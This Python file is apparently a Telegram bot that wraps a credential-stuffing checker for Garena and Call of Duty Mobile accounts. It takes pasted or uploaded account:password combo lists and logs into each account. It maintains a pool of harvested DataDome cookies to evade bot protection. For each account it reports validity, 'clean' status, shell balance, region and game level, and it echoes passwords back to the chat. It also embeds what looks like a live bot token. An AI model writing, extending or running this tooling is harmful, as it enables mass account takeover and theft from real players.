#!/usr/bin/env python3
"""
Telegram bot wrapper for VINCE CODM checker.
- Self-fetching datadome cookie pool (background refresh, no manual file)
- Per-chat queues, isolated state, one active queue per chat
- Live-editing status message, one result per account posted inline
- Commands: /start /stats /stop /cookies
"""

import asyncio
import logging
import os
import re
import threading
import time
from collections import deque
from pathlib import Path

import requests

import shamp  # checker lives here — do not modify

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, ContextTypes
)

logging.basicConfig(
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    level=logging.INFO,
)
logger = logging.getLogger('codm-bot')
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)


# ══════════════════════════════════════════════════════════════════════
# COOKIE POOL — background-refreshed, no manual fresh_cookie.txt
# ══════════════════════════════════════════════════════════════════════

class CookiePool:
    """Maintains N fresh datadome cookies, consumed by workers, refilled in background."""

    def __init__(self, size: int = 8, refresh_interval: float = 8.0):
        self.cookies: deque = deque(maxlen=size * 4)
        self.size = size
        self.refresh_interval = refresh_interval
        self.lock = threading.Lock()
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._stats = {'fetched': 0, 'failed': 0, 'consumed': 0}

    def start(self):
        if self._thread and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._refresh_loop, daemon=True)
        self._thread.start()
        logger.info('CookiePool started (target=%d)', self.size)

    def stop(self):
        self._stop.set()

    def _refresh_loop(self):
        while not self._stop.is_set():
            try:
                with self.lock:
                    need = self.size - len(self.cookies)
                if need > 0:
                    s = requests.Session()
                    try:
                        shamp.init_ga_cookies(s)
                        dd = shamp.get_datadome_cookie(s)
                    finally:
                        s.close()
                    if dd:
                        with self.lock:
                            self.cookies.append(dd)
                        self._stats['fetched'] += 1
                    else:
                        self._stats['failed'] += 1
                        time.sleep(1.5)
                time.sleep(self.refresh_interval)
            except Exception as e:
                logger.warning('CookiePool refresh error: %s', e)
                time.sleep(4)

    def get(self) -> str | None:
        with self.lock:
            if self.cookies:
                self._stats['consumed'] += 1
                return self.cookies.popleft()
        # Sync fallback so a worker never blocks forever on an empty pool
        try:
            s = requests.Session()
            shamp.init_ga_cookies(s)
            dd = shamp.get_datadome_cookie(s)
            s.close()
            if dd:
                self._stats['fetched'] += 1
            return dd
        except Exception as e:
            logger.warning('CookiePool sync fetch failed: %s', e)
            return None

    def stats(self) -> dict:
        with self.lock:
            return dict(self._stats, available=len(self.cookies), target=self.size)


cookie_pool = CookiePool(size=8, refresh_interval=8.0)


# ══════════════════════════════════════════════════════════════════════
# SHOP-ROLES CODM DETECTION (region-agnostic, live endpoint)
# ══════════════════════════════════════════════════════════════════════

CODM_APP_ID = '100082'

_SHOP_DOMAIN = {
    'id': 'kiosgamer.co.id',
    'vn': 'napthe.vn',
    'th': 'termgame.com',
    'in': 'termgame.com',
}


def _shop_domain(uac: str) -> str:
    uac = (uac or 'ph').lower()
    return _SHOP_DOMAIN.get(uac, f'shop.garena.{uac}')


def _extract_role(j):
    """Dig a role out of any of the roles-endpoint response shapes."""
    if isinstance(j, dict):
        r = j.get('role')
        if isinstance(r, list) and r:
            item = r[0]
            if isinstance(item, dict):
                return item.get('role') or item.get('user_id'), item.get('nickname') or item.get('name')
            return str(item), None
        if isinstance(r, dict):
            return r.get('role') or r.get('user_id'), r.get('nickname') or r.get('name')
        for k, v in j.items():
            if k == CODM_APP_ID and isinstance(v, list) and v:
                item = v[0]
                if isinstance(item, dict):
                    return item.get('role') or item.get('user_id'), item.get('nickname') or item.get('name')
                return str(item), None
        for key in ('data', 'roles', 'result'):
            if key in j:
                return _extract_role(j[key])
    if isinstance(j, list) and j:
        item = j[0]
        if isinstance(item, dict):
            return item.get('role') or item.get('user_id'), item.get('nickname') or item.get('name')
        return str(item), None
    return None, None


def detect_codm_via_shop(session) -> tuple[bool, dict]:
    """Primary CODM detector — Garena storefront roles endpoint. Region-agnostic."""
    try:
        r = session.post(
            'https://authgop.garena.com/oauth/token/grant',
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/129.0.0.0 Mobile Safari/537.36',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            data=(
                f'client_id=10017&response_type=token'
                f'&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D{CODM_APP_ID}'
                f'&format=json&id={int(time.time() * 1000)}'
            ),
            timeout=15,
        )
        access_token = r.json().get('access_token', '')
        if not access_token:
            return False, {}

        r = session.post(
            'https://shop.garena.sg/api/auth/inspect_token',
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/129.0.0.0 Mobile Safari/537.36',
                'Accept': '*/*',
                'Content-Type': 'application/json',
            },
            json={'token': access_token},
            timeout=15,
        )
        inspect = r.json()
        session_key = r.cookies.get('session_key') or session.cookies.get('session_key')
        if not session_key:
            return False, {}

        uac = str(inspect.get('uac', 'ph')).lower()
        region = uac.upper() if uac else 'PH'
        base = _shop_domain(uac)

        r = session.get(
            f'https://{base}/api/shop/apps/roles',
            params={'app_id': CODM_APP_ID},
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/129.0.0.0 Mobile Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Referer': f'https://{base}/?app={CODM_APP_ID}',
                'Cookie': f'session_key={session_key}',
            },
            timeout=15,
        )
        role, nickname = _extract_role(r.json())
        if role:
            return True, {
                'codm_uid': str(role),
                'codm_nickname': nickname or 'N/A',
                'region': region,
                'codm_level': 'N/A',
            }
        return False, {}
    except Exception as e:
        logger.debug('shop detect failed: %s', e)
        return False, {}


def check_codm_full(session) -> tuple[bool, dict]:
    """Shop roles primary, legacy delete-request fallback."""
    has, info = detect_codm_via_shop(session)
    if has:
        return True, info
    try:
        return shamp.check_codm_account(session, '')
    except Exception:
        return False, {}


# ══════════════════════════════════════════════════════════════════════
# CHECK ONE ACCOUNT
# ══════════════════════════════════════════════════════════════════════

def check_single(account: str, password: str, cookie_value: str | None) -> dict:
    """
    One account check. Runs on a worker thread.
    Returns a flat result dict — never raises.
    """
    r = {
        'account': account, 'password': password,
        'valid': False, 'clean': False, 'has_codm': False,
        'codm_level': 0, 'codm_nickname': 'N/A', 'region': 'N/A',
        'shell': 0, 'country': 'N/A', 'uid': 'N/A',
        'email_display': 'N/A', 'mobile': 'N/A', 'error': None,
    }

    session = requests.Session()
    try:
        shamp.init_ga_cookies(session)
        dm = shamp.DataDomeManager()
        if cookie_value:
            session.cookies.set('datadome', cookie_value, domain='.garena.com')
            dm.set_datadome(cookie_value)
            dm.set_session_datadome(session, cookie_value)

        v1, v2, new_dd = shamp.prelogin(session, account, dm, None, retries=3)
        if v1 == 'IP_BLOCKED':
            r['error'] = 'IP_BLOCKED'
            return r
        if not v1 or not v2:
            r['error'] = "account doesn't exist"
            return r
        if new_dd:
            dm.set_datadome(new_dd)
            dm.set_session_datadome(session, new_dd)

        sso_key = shamp.login(session, account, password, v1, v2)
        if not sso_key:
            r['error'] = 'incorrect password'
            return r
        if isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
            r['error'] = sso_key.split(':', 1)[1]
            return r

        # Account init
        cookies = session.cookies.get_dict()
        parts = [f'{k}={cookies[k]}' for k in
                 ('apple_state_key', 'datadome', 'sso_key',
                  '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX') if k in cookies]
        headers = {
            'accept': '*/*',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/129.0.0.0 Mobile Safari/537.36',
        }
        if parts:
            headers['cookie'] = '; '.join(parts)
        resp = session.get('https://account.garena.com/api/account/init',
                           headers=headers, timeout=15)
        if resp.status_code != 200:
            r['error'] = f'init HTTP {resp.status_code}'
            return r
        data = resp.json()
        if 'error' in data:
            r['error'] = data['error']
            return r

        det = shamp.parse_account_details(data)
        det['login_history'] = data.get('login_history', [])

        r['valid'] = True
        r['clean'] = det.get('is_clean', False)
        r['country'] = det.get('personal', {}).get('country', 'N/A')
        r['uid'] = det.get('uid', 'N/A')
        r['shell'] = det.get('profile', {}).get('shell_balance', 0)
        r['email_display'] = det.get('email', 'N/A')
        r['mobile'] = shamp.format_mobile_number(
            det['personal'].get('mobile_no', 'N/A'),
            det['personal'].get('country_code', 'N/A'),
        )

        has_codm, codm = check_codm_full(session)
        r['has_codm'] = has_codm
        if has_codm and codm:
            lvl = codm.get('codm_level', 0)
            try:
                r['codm_level'] = int(lvl) if lvl not in ('N/A', None, '') else 0
            except (ValueError, TypeError):
                r['codm_level'] = 0
            r['codm_nickname'] = codm.get('codm_nickname', 'N/A')
            r['region'] = codm.get('region', 'N/A')

        # Reinject rotated cookie back into pool
        rotated = session.cookies.get('datadome')
        if rotated and rotated != cookie_value:
            with cookie_pool.lock:
                cookie_pool.cookies.append(rotated)

        return r
    except Exception as e:
        r['error'] = f'{type(e).__name__}: {e}'
        return r
    finally:
        try:
            session.close()
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════
# CHAT STATE
# ══════════════════════════════════════════════════════════════════════

class ChatState:
    __slots__ = (
        'chat_id', 'queue', 'valid', 'invalid', 'clean', 'not_clean',
        'has_codm', 'no_codm', 'errors', 'checked', 'total',
        'start_time', 'worker_task',
    )

    def __init__(self, chat_id: int):
        self.chat_id = chat_id
        self.queue: asyncio.Queue = asyncio.Queue()
        self.valid = self.invalid = 0
        self.clean = self.not_clean = 0
        self.has_codm = self.no_codm = 0
        self.errors = 0
        self.checked = 0
        self.total = 0
        self.start_time = time.time()
        self.worker_task: asyncio.Task | None = None


class BotState:
    def __init__(self):
        self.chats: dict[int, ChatState] = {}

    def get(self, chat_id: int) -> ChatState:
        if chat_id not in self.chats:
            self.chats[chat_id] = ChatState(chat_id)
        return self.chats[chat_id]


bot_state = BotState()


# ══════════════════════════════════════════════════════════════════════
# FORMATTING
# ══════════════════════════════════════════════════════════════════════

def _esc(s) -> str:
    """Escape for MarkdownV1 — only `, _, * need escaping."""
    return re.sub(r'([`_*])', r'\\\1', str(s))


def _format_result(r: dict) -> str:
    acc = _esc(r['account'])
    pwd = _esc(r['password'])
    if not r['valid']:
        err = _esc(r.get('error') or 'invalid')
        return f'❌ `{acc}:{pwd}` — {err}'
    tag = '✅ CLEAN' if r['clean'] else '⚠️ NOT CLEAN'
    codm_line = (f"Lv.{r['codm_level']}" if r['has_codm'] and r['codm_level']
                 else ('no level' if r['has_codm'] else 'no CODM'))
    return (
        f'{tag} — `{acc}`\n'
        f'• CODM: {_esc(codm_line)}\n'
        f'• Shell: `{r["shell"]}`\n'
        f'• Region: `{_esc(r["region"])}`\n'
        f'• Country: `{_esc(r["country"])}`'
    )


def _format_live(state: ChatState, final: bool = False) -> str:
    elapsed = max(time.time() - state.start_time, 0.001)
    speed = state.checked / elapsed
    remaining = max(state.total - state.checked, 0)
    eta = int(remaining / speed) if speed > 0 else 0
    head = '🏁 FINAL' if final else '📊 LIVE'
    bar_len = 16
    done = state.checked / state.total if state.total else 0
    filled = int(bar_len * done)
    bar = '█' * filled + '░' * (bar_len - filled)
    return (
        f'{head} — `{state.checked}`/`{state.total}`\n'
        f'`{bar}` {done * 100:.1f}%\n'
        f'✅ `{state.valid}`  ❌ `{state.invalid}`  ⚠️ `{state.errors}`\n'
        f'🧼 `{state.clean}`  🧴 `{state.not_clean}`\n'
        f'🎮 `{state.has_codm}`  🚫 `{state.no_codm}`\n'
        f'⏱ `{elapsed:.0f}s`  ⚡ `{speed:.2f}/s`  ⌛ `{eta}s`'
    )


# ══════════════════════════════════════════════════════════════════════
# QUEUE WORKER
# ══════════════════════════════════════════════════════════════════════

async def _worker_loop(chat_id: int, bot):
    state = bot_state.get(chat_id)
    status_msg = None
    last_edit = 0.0

    try:
        while True:
            try:
                acc, pwd = state.queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            cookie_value = await asyncio.to_thread(cookie_pool.get)
            result = await asyncio.to_thread(check_single, acc, pwd, cookie_value)

            state.checked += 1
            err = (result.get('error') or '').lower()
            if result['valid']:
                state.valid += 1
                if result['clean']:
                    state.clean += 1
                else:
                    state.not_clean += 1
                if result['has_codm']:
                    state.has_codm += 1
                else:
                    state.no_codm += 1
            elif any(k in err for k in ('password', "doesn't exist", 'no_account',
                                        'error_auth', 'error_user_ban', 'error_security_ban')):
                state.invalid += 1
            elif 'ip_blocked' in err:
                state.errors += 1
                await bot.send_message(
                    chat_id=chat_id,
                    text='🌐 *IP blocked* — swap IP (VPN/mobile data) and retry.',
                    parse_mode=ParseMode.MARKDOWN,
                )
            else:
                state.errors += 1

            # Post every result
            try:
                await bot.send_message(
                    chat_id=chat_id,
                    text=_format_result(result),
                    parse_mode=ParseMode.MARKDOWN,
                )
            except Exception as e:
                logger.debug('send result failed: %s', e)

            # Edit status every 3s
            now = time.time()
            if now - last_edit >= 3.0:
                text = _format_live(state)
                try:
                    if status_msg is None:
                        status_msg = await bot.send_message(
                            chat_id=chat_id, text=text, parse_mode=ParseMode.MARKDOWN,
                        )
                    else:
                        await status_msg.edit_text(text, parse_mode=ParseMode.MARKDOWN)
                except Exception as e:
                    logger.debug('status edit failed: %s', e)
                last_edit = now

    except asyncio.CancelledError:
        logger.info('chat %d worker cancelled', chat_id)
    except Exception as e:
        logger.exception('worker crash chat %d: %s', chat_id, e)
    finally:
        final = _format_live(state, final=True)
        try:
            if status_msg is not None:
                await status_msg.edit_text(final, parse_mode=ParseMode.MARKDOWN)
            else:
                await bot.send_message(
                    chat_id=chat_id, text=final, parse_mode=ParseMode.MARKDOWN,
                )
        except Exception:
            pass


async def _start_queue(update: Update, context: ContextTypes.DEFAULT_TYPE, combos: list[tuple[str, str]]):
    chat_id = update.effective_chat.id
    state = bot_state.get(chat_id)

    if state.worker_task and not state.worker_task.done():
        await update.message.reply_text(
            '⚠️ A queue is already running. Use /stop first.',
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # Reset state for this run
    state.total = len(combos)
    state.checked = 0
    state.valid = state.invalid = state.errors = 0
    state.clean = state.not_clean = 0
    state.has_codm = state.no_codm = 0
    state.start_time = time.time()

    while not state.queue.empty():
        try:
            state.queue.get_nowait()
        except asyncio.QueueEmpty:
            break

    for acc, pwd in combos:
        await state.queue.put((acc, pwd))

    await update.message.reply_text(
        f'🚀 Queued *{len(combos)}* combos. Results stream below.\n'
        f'Commands: /stats /stop /cookies',
        parse_mode=ParseMode.MARKDOWN,
    )
    state.worker_task = context.application.create_task(
        _worker_loop(chat_id, context.bot)
    )


# ══════════════════════════════════════════════════════════════════════
# HANDLERS
# ══════════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        '🥔 *VINCE CODM BOT*\n\n'
        'Send combos to check:\n'
        '• Paste `account:password` lines as a message\n'
        '• Or upload a `.txt` file, one combo per line\n\n'
        '*Commands*\n'
        '`/stats` — current chat stats\n'
        '`/stop` — halt current queue\n'
        '`/cookies` — cookie pool status',
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = bot_state.get(update.effective_chat.id)
    if state.total == 0:
        await update.message.reply_text('No checks run yet in this chat.')
        return
    await update.message.reply_text(_format_live(state, final=True), parse_mode=ParseMode.MARKDOWN)


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = bot_state.get(update.effective_chat.id)
    if state.worker_task and not state.worker_task.done():
        state.worker_task.cancel()
        await update.message.reply_text('🛑 Stop signal sent.')
    else:
        await update.message.reply_text('No active queue.')


async def cmd_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    s = cookie_pool.stats()
    await update.message.reply_text(
        f'🍪 *Cookie Pool*\n'
        f'Available: `{s["available"]}` / `{s["target"]}`\n'
        f'Fetched: `{s["fetched"]}`\n'
        f'Failed: `{s["failed"]}`\n'
        f'Consumed: `{s["consumed"]}`',
        parse_mode=ParseMode.MARKDOWN,
    )


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ''
    combos = []
    for line in text.splitlines():
        acc, pwd = shamp.clean_account_line(line)
        if acc and pwd:
            combos.append((acc, pwd))
    if not combos:
        await update.message.reply_text(
            'No valid `account:password` lines found.',
            parse_mode=ParseMode.MARKDOWN,
        )
        return
    await _start_queue(update, context, combos)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.lower().endswith('.txt'):
        await update.message.reply_text('Please upload a `.txt` file.')
        return
    if doc.file_size and doc.file_size > 5 * 1024 * 1024:
        await update.message.reply_text('File too large (limit 5 MB).')
        return

    file = await doc.get_file()
    raw = await file.download_as_bytearray()
    text = raw.decode('utf-8', errors='ignore')

    combos = []
    for line in text.splitlines():
        acc, pwd = shamp.clean_account_line(line)
        if acc and pwd:
            combos.append((acc, pwd))

    if not combos:
        await update.message.reply_text('No valid combos in file.')
        return
    await _start_queue(update, context, combos)


# ══════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════

def _load_token() -> str | None:
    tok = os.environ.get('BOT_TOKEN', '8702549007:AAHe3d-RSBaYs4wX4D4x4rkLpevipByEPqs').strip()
    if tok:
        return tok
    p = Path('bot_token.txt')
    if p.exists():
        return p.read_text(encoding='utf-8').strip() or None
    return None


def main():
    token = _load_token()
    if not token:
        print('Set BOT_TOKEN env, or create bot_token.txt with the token.')
        return

    cookie_pool.start()

    app = Application.builder().token(token).build()
    app.add_handler(CommandHandler('start', cmd_start))
    app.add_handler(CommandHandler('stats', cmd_stats))
    app.add_handler(CommandHandler('stop', cmd_stop))
    app.add_handler(CommandHandler('cookies', cmd_cookies))
    app.add_handler(MessageHandler(filters.Document.TXT, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    logger.info('Bot starting...')
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        cookie_pool.stop()
        print('Bot stopped.')
